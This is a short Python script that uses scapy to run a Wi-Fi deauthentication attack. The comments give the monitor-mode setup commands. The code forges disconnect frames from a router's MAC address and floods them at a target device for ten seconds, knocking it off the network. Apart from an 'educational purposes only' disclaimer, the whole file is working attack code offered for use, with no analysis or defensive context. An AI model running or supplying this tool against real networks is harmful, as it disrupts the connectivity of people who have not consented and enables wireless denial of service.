# Deauth attack is used to drop a device on a wireless network. 
# This attack sends fake "disconnect" (deauthentication) packets to the target device, temporarily knocking it off the network.
# sudo ifconfig wlan0 down (Put your wifi adapter in monitor mode)
# sudo iwconfig wlan0 mode monitor
# sudo ifconfig wlan0 up

# Make sure you change the above MAC addresses accordingly before running the code.
# The code sends deauth packets to knock the target device off the network for 10 seconds. 
# At the end of the period, the connection can be restored.

# Don't forget to download scapy packet



#It is for educational purposes only!!!
#Do not use it for illegal things!!!
#The code owner does not accept any responsibility!!!

from scapy.all import *
import time

def deauth_attack(target_mac, gateway_mac, interface="wlan0"):
    # Create a Deauth package
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Send packets continuously (for 10 seconds)
    print(f"{target_mac} Initiating a deauth attack on your device...")
    end_time = time.time() + 10  # 10 seconds
    while time.time() < end_time:
        sendp(packet, iface=interface, count=100, inter=.1)
    
    print(f"{target_mac} Deauth packet was sent to the device for 10 seconds.")
    
# Get target device and gateway MAC addresses from user
target_mac = "XX:XX:XX:XX:XX:XX"  # MAC address of the target device (MAC address of the device with IP e.g. 192.168.x.x)
gateway_mac = "YY:YY:YY:YY:YY:YY"  # MAC address of the router (modem)
interface = "wlan0"  # Wi-Fi interface

# Launch Deauth attack
deauth_attack(target_mac, gateway_mac, interface)
